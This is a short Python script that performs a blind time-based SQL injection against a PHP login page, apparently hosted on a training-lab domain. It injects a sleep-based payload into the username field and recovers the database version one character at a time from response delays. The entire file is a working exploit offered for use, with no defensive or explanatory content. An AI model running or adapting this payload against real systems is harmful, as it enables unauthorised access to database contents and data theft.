import requests
import time

url = "https://ka20ng68a042emu2ghu2v.ap-southeast-6.attackdefensecloudlabs.com/citasmedicas.php?pag=citasmedindex"
payload_list = ['.','-',0,1,2,3,4,5,6,7,8,9,'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z']
result=''

def request(url, count, num):
    payload = {
        "username": f"' or (substr(version(),{count},1)= '{num}') and (select sleep(0.3) from dual where database() like '%')#",
        "password": "something"
    }

    # Measure the start time
    start_time = time.time()

    # Send the POST request with headers and data
    response = requests.post(url, data=payload)

    # Measure the end time
    end_time = time.time()

    # Calculate the elapsed time
    elapsed_time = end_time - start_time

    # Print the status code, response text, and response time
    
    
    if float(elapsed_time) > 2:
        print(f"Response Time: {elapsed_time} seconds")
        return True

for i in range(1,25):
    for j in payload_list:
        print('trying placeholder '+str(i)+'with '+str(j))
        if request(url,i,j):
            result+=str(j)
            print(result)
            break

